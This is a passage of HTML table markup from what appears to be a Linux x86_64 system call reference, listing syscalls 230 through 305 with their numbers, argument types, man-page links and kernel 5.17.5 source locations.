href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_nanosleep.2.html">sys_clock_nanosleep</a></td><td>0xe6</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec __user *rqtp</td><td>struct __kernel_timespec __user *rmtp</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-stubs.c#L128">kernel&#x2F;time&#x2F;posix-stubs.c:128</a></td></tr><tr><td>231</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit_group.2.html">sys_exit_group</a></td><td>0xe7</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/exit.c#L959">kernel&#x2F;exit.c:959</a></td></tr><tr><td>232</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_wait.2.html">sys_epoll_wait</a></td><td>0xe8</td><td>int epfd</td><td>struct epoll_event __user *events</td><td>int maxevents</td><td>int timeout</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2265">fs&#x2F;eventpoll.c:2265</a></td></tr><tr><td>233</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_ctl.2.html">sys_epoll_ctl</a></td><td>0xe9</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event __user *event</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2207">fs&#x2F;eventpoll.c:2207</a></td></tr><tr><td>234</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tgkill.2.html">sys_tgkill</a></td><td>0xea</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3952">kernel&#x2F;signal.c:3952</a></td></tr><tr><td>235</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimes.2.html">sys_utimes</a></td><td>0xeb</td><td>char __user *filename</td><td>struct __kernel_old_timeval __user *utimes</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/utimes.c#L208">fs&#x2F;utimes.c:208</a></td></tr><tr><td>236</td><td>not implemented</td><td>0xec</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>237</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mbind.2.html">sys_mbind</a></td><td>0xed</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mempolicy.c#L1558">mm&#x2F;mempolicy.c:1558</a></td></tr><tr><td>238</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_mempolicy.2.html">sys_set_mempolicy</a></td><td>0xee</td><td>int mode</td><td>const unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mempolicy.c#L1585">mm&#x2F;mempolicy.c:1585</a></td></tr><tr><td>239</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_mempolicy.2.html">sys_get_mempolicy</a></td><td>0xef</td><td>int __user *policy</td><td>unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mempolicy.c#L1717">mm&#x2F;mempolicy.c:1717</a></td></tr><tr><td>240</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_open.2.html">sys_mq_open</a></td><td>0xf0</td><td>const char __user *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr __user *attr</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L942">ipc&#x2F;mqueue.c:942</a></td></tr><tr><td>241</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_unlink.2.html">sys_mq_unlink</a></td><td>0xf1</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L952">ipc&#x2F;mqueue.c:952</a></td></tr><tr><td>242</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedsend.2.html">sys_mq_timedsend</a></td><td>0xf2</td><td>mqd_t mqdes</td><td>const char __user *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec __user *abs_timeout</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L1284">ipc&#x2F;mqueue.c:1284</a></td></tr><tr><td>243</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedreceive.2.html">sys_mq_timedreceive</a></td><td>0xf3</td><td>mqd_t mqdes</td><td>char __user *msg_ptr</td><td>size_t msg_len</td><td>unsigned int __user *msg_prio</td><td>const struct __kernel_timespec __user *abs_timeout</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L1298">ipc&#x2F;mqueue.c:1298</a></td></tr><tr><td>244</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_notify.2.html">sys_mq_notify</a></td><td>0xf4</td><td>mqd_t mqdes</td><td>const struct sigevent __user *notification</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L1440">ipc&#x2F;mqueue.c:1440</a></td></tr><tr><td>245</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_getsetattr.2.html">sys_mq_getsetattr</a></td><td>0xf5</td><td>mqd_t mqdes</td><td>const struct mq_attr __user *mqstat</td><td>struct mq_attr __user *omqstat</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L1496">ipc&#x2F;mqueue.c:1496</a></td></tr><tr><td>246</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kexec_load.2.html">sys_kexec_load</a></td><td>0xf6</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment __user *segments</td><td>unsigned long flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/kexec.c#L228">kernel&#x2F;kexec.c:228</a></td></tr><tr><td>247</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitid.2.html">sys_waitid</a></td><td>0xf7</td><td>int which</td><td>pid_t pid</td><td>struct siginfo __user *infop</td><td>int options</td><td>struct rusage __user *ru</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/exit.c#L1638">kernel&#x2F;exit.c:1638</a></td></tr><tr><td>248</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/add_key.2.html">sys_add_key</a></td><td>0xf8</td><td>const char __user *_type</td><td>const char __user *_description</td><td>const void __user *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/keys/keyctl.c#L74">security&#x2F;keys&#x2F;keyctl.c:74</a></td></tr><tr><td>249</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/request_key.2.html">sys_request_key</a></td><td>0xf9</td><td>const char __user *_type</td><td>const char __user *_description</td><td>const char __user *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/keys/keyctl.c#L167">security&#x2F;keys&#x2F;keyctl.c:167</a></td></tr><tr><td>250</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/keyctl.2.html">sys_keyctl</a></td><td>0xfa</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/keys/keyctl.c#L1869">security&#x2F;keys&#x2F;keyctl.c:1869</a></td></tr><tr><td>251</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_set.2.html">sys_ioprio_set</a></td><td>0xfb</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/block/ioprio.c#L68">block&#x2F;ioprio.c:68</a></td></tr><tr><td>252</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_get.2.html">sys_ioprio_get</a></td><td>0xfc</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/block/ioprio.c#L209">block&#x2F;ioprio.c:209</a></td></tr><tr><td>253</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init.2.html">sys_inotify_init</a></td><td>0xfd</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/inotify/inotify_user.c#L720">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:720</a></td></tr><tr><td>254</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_add_watch.2.html">sys_inotify_add_watch</a></td><td>0xfe</td><td>int fd</td><td>const char __user *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/inotify/inotify_user.c#L730">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:730</a></td></tr><tr><td>255</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_rm_watch.2.html">sys_inotify_rm_watch</a></td><td>0xff</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/inotify/inotify_user.c#L794">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:794</a></td></tr><tr><td>256</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/migrate_pages.2.html">sys_migrate_pages</a></td><td>0x100</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long __user *from</td><td>const unsigned long __user *to</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mempolicy.c#L1679">mm&#x2F;mempolicy.c:1679</a></td></tr><tr><td>257</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/openat.2.html">sys_openat</a></td><td>0x101</td><td>int dfd</td><td>const char __user *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L1337">fs&#x2F;open.c:1337</a></td></tr><tr><td>258</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdirat.2.html">sys_mkdirat</a></td><td>0x102</td><td>int dfd</td><td>const char __user * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4074">fs&#x2F;namei.c:4074</a></td></tr><tr><td>259</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknodat.2.html">sys_mknodat</a></td><td>0x103</td><td>int dfd</td><td>const char __user * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L3990">fs&#x2F;namei.c:3990</a></td></tr><tr><td>260</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchownat.2.html">sys_fchownat</a></td><td>0x104</td><td>int dfd</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L779">fs&#x2F;open.c:779</a></td></tr><tr><td>261</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futimesat.2.html">sys_futimesat</a></td><td>0x105</td><td>int dfd</td><td>const char __user *filename</td><td>struct __kernel_old_timeval __user *utimes</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/utimes.c#L202">fs&#x2F;utimes.c:202</a></td></tr><tr><td>262</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newfstatat.2.html">sys_newfstatat</a></td><td>0x106</td><td>int dfd</td><td>const char __user *filename</td><td>struct stat __user *statbuf</td><td>int flag</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L431">fs&#x2F;stat.c:431</a></td></tr><tr><td>263</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlinkat.2.html">sys_unlinkat</a></td><td>0x107</td><td>int dfd</td><td>const char __user * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4356">fs&#x2F;namei.c:4356</a></td></tr><tr><td>264</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/renameat.2.html">sys_renameat</a></td><td>0x108</td><td>int olddfd</td><td>const char __user * oldname</td><td>int newdfd</td><td>const char __user * newname</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4967">fs&#x2F;namei.c:4967</a></td></tr><tr><td>265</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/linkat.2.html">sys_linkat</a></td><td>0x109</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4625">fs&#x2F;namei.c:4625</a></td></tr><tr><td>266</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlinkat.2.html">sys_symlinkat</a></td><td>0x10a</td><td>const char __user * oldname</td><td>int newdfd</td><td>const char __user * newname</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4444">fs&#x2F;namei.c:4444</a></td></tr><tr><td>267</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlinkat.2.html">sys_readlinkat</a></td><td>0x10b</td><td>int dfd</td><td>const char __user *path</td><td>char __user *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L492">fs&#x2F;stat.c:492</a></td></tr><tr><td>268</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmodat.2.html">sys_fchmodat</a></td><td>0x10c</td><td>int dfd</td><td>const char __user * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L655">fs&#x2F;open.c:655</a></td></tr><tr><td>269</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/faccessat.2.html">sys_faccessat</a></td><td>0x10d</td><td>int dfd</td><td>const char __user *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L492">fs&#x2F;open.c:492</a></td></tr><tr><td>270</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pselect6.2.html">sys_pselect6</a></td><td>0x10e</td><td>int</td><td>fd_set __user *</td><td>fd_set __user *</td><td>fd_set __user *</td><td>struct __kernel_timespec __user *</td><td>void __user *</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/select.c#L795">fs&#x2F;select.c:795</a></td></tr><tr><td>271</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ppoll.2.html">sys_ppoll</a></td><td>0x10f</td><td>struct pollfd __user *</td><td>unsigned int</td><td>struct __kernel_timespec __user *</td><td>const sigset_t __user *</td><td>size_t</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/select.c#L1101">fs&#x2F;select.c:1101</a></td></tr><tr><td>272</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unshare.2.html">sys_unshare</a></td><td>0x110</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/fork.c#L3262">kernel&#x2F;fork.c:3262</a></td></tr><tr><td>273</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_robust_list.2.html">sys_set_robust_list</a></td><td>0x111</td><td>struct robust_list_head __user *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/futex/syscalls.c#L29">kernel&#x2F;futex&#x2F;syscalls.c:29</a></td></tr><tr><td>274</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_robust_list.2.html">sys_get_robust_list</a></td><td>0x112</td><td>int pid</td><td>struct robust_list_head __user * __user *head_ptr</td><td>size_t __user *len_ptr</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/futex/syscalls.c#L49">kernel&#x2F;futex&#x2F;syscalls.c:49</a></td></tr><tr><td>275</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/splice.2.html">sys_splice</a></td><td>0x113</td><td>int fd_in</td><td>loff_t __user *off_in</td><td>int fd_out</td><td>loff_t __user *off_out</td><td>size_t len</td><td>unsigned int flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/splice.c#L1328">fs&#x2F;splice.c:1328</a></td></tr><tr><td>276</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tee.2.html">sys_tee</a></td><td>0x114</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/splice.c#L1694">fs&#x2F;splice.c:1694</a></td></tr><tr><td>277</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync_file_range.2.html">sys_sync_file_range</a></td><td>0x115</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/sync.c#L370">fs&#x2F;sync.c:370</a></td></tr><tr><td>278</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vmsplice.2.html">sys_vmsplice</a></td><td>0x116</td><td>int fd</td><td>const struct iovec __user *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/splice.c#L1292">fs&#x2F;splice.c:1292</a></td></tr><tr><td>279</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/move_pages.2.html">sys_move_pages</a></td><td>0x117</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void __user * __user *pages</td><td>const int __user *nodes</td><td>int __user *status</td><td>int flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/migrate.c#L2063">mm&#x2F;migrate.c:2063</a></td></tr><tr><td>280</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimensat.2.html">sys_utimensat</a></td><td>0x118</td><td>int dfd</td><td>const char __user *filename</td><td>struct __kernel_timespec __user *utimes</td><td>int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/utimes.c#L147">fs&#x2F;utimes.c:147</a></td></tr><tr><td>281</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_pwait.2.html">sys_epoll_pwait</a></td><td>0x119</td><td>int epfd</td><td>struct epoll_event __user *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t __user *sigmask</td><td>size_t sigsetsize</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2299">fs&#x2F;eventpoll.c:2299</a></td></tr><tr><td>282</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd.2.html">sys_signalfd</a></td><td>0x11a</td><td>int ufd</td><td>sigset_t __user *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/signalfd.c#L314">fs&#x2F;signalfd.c:314</a></td></tr><tr><td>283</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_create.2.html">sys_timerfd_create</a></td><td>0x11b</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/timerfd.c#L406">fs&#x2F;timerfd.c:406</a></td></tr><tr><td>284</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd.2.html">sys_eventfd</a></td><td>0x11c</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventfd.c#L463">fs&#x2F;eventfd.c:463</a></td></tr><tr><td>285</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fallocate.2.html">sys_fallocate</a></td><td>0x11d</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L352">fs&#x2F;open.c:352</a></td></tr><tr><td>286</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_settime.2.html">sys_timerfd_settime</a></td><td>0x11e</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec __user *utmr</td><td>struct __kernel_itimerspec __user *otmr</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/timerfd.c#L558">fs&#x2F;timerfd.c:558</a></td></tr><tr><td>287</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_gettime.2.html">sys_timerfd_gettime</a></td><td>0x11f</td><td>int ufd</td><td>struct __kernel_itimerspec __user *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/timerfd.c#L576">fs&#x2F;timerfd.c:576</a></td></tr><tr><td>288</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/accept4.2.html">sys_accept4</a></td><td>0x120</td><td>int</td><td>struct sockaddr __user *</td><td>int __user *</td><td>int</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1935">net&#x2F;socket.c:1935</a></td></tr><tr><td>289</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd4.2.html">sys_signalfd4</a></td><td>0x121</td><td>int ufd</td><td>sigset_t __user *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/signalfd.c#L302">fs&#x2F;signalfd.c:302</a></td></tr><tr><td>290</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd2.2.html">sys_eventfd2</a></td><td>0x122</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventfd.c#L458">fs&#x2F;eventfd.c:458</a></td></tr><tr><td>291</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create1.2.html">sys_epoll_create1</a></td><td>0x123</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2032">fs&#x2F;eventpoll.c:2032</a></td></tr><tr><td>292</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup3.2.html">sys_dup3</a></td><td>0x124</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/file.c#L1249">fs&#x2F;file.c:1249</a></td></tr><tr><td>293</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe2.2.html">sys_pipe2</a></td><td>0x125</td><td>int __user *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/pipe.c#L1026">fs&#x2F;pipe.c:1026</a></td></tr><tr><td>294</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init1.2.html">sys_inotify_init1</a></td><td>0x126</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/inotify/inotify_user.c#L720">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:720</a></td></tr><tr><td>295</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv.2.html">sys_preadv</a></td><td>0x127</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1053">fs&#x2F;read_write.c:1053</a></td></tr><tr><td>296</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev.2.html">sys_pwritev</a></td><td>0x128</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1073">fs&#x2F;read_write.c:1073</a></td></tr><tr><td>297</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_tgsigqueueinfo.2.html">sys_rt_tgsigqueueinfo</a></td><td>0x129</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t __user *uinfo</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L4036">kernel&#x2F;signal.c:4036</a></td></tr><tr><td>298</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/perf_event_open.2.html">sys_perf_event_open</a></td><td>0x12a</td><td>struct perf_event_attr __user *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/events/core.c#L12212">kernel&#x2F;events&#x2F;core.c:12212</a></td></tr><tr><td>299</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmmsg.2.html">sys_recvmmsg</a></td><td>0x12b</td><td>int fd</td><td>struct mmsghdr __user *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct __kernel_timespec __user *timeout</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2932">net&#x2F;socket.c:2932</a></td></tr><tr><td>300</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fanotify_init.2.html">sys_fanotify_init</a></td><td>0x12c</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/fanotify/fanotify_user.c#L1344">fs&#x2F;notify&#x2F;fanotify&#x2F;fanotify_user.c:1344</a></td></tr><tr><td>301</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fanotify_mark.2.html">sys_fanotify_mark</a></td><td>0x12d</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char __user *pathname</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/fanotify/fanotify_user.c#L1822">fs&#x2F;notify&#x2F;fanotify&#x2F;fanotify_user.c:1822</a></td></tr><tr><td>302</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/prlimit64.2.html">sys_prlimit64</a></td><td>0x12e</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 __user *new_rlim</td><td>struct rlimit64 __user *old_rlim</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1664">kernel&#x2F;sys.c:1664</a></td></tr><tr><td>303</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/name_to_handle_at.2.html">sys_name_to_handle_at</a></td><td>0x12f</td><td>int dfd</td><td>const char __user *name</td><td>struct file_handle __user *handle</td><td>int __user *mnt_id</td><td>int flag</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fhandle.c#L93">fs&#x2F;fhandle.c:93</a></td></tr><tr><td>304</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/open_by_handle_at.2.html">sys_open_by_handle_at</a></td><td>0x130</td><td>int mountdirfd</td><td>struct file_handle __user *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fhandle.c#L256">fs&#x2F;fhandle.c:256</a></td></tr><tr><td>305</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_adjtime.2.html">sys_clock_adjtime</a></td><td>0x131</td><td>clockid_t which_clock</td><td>struct __kernel_timex __user 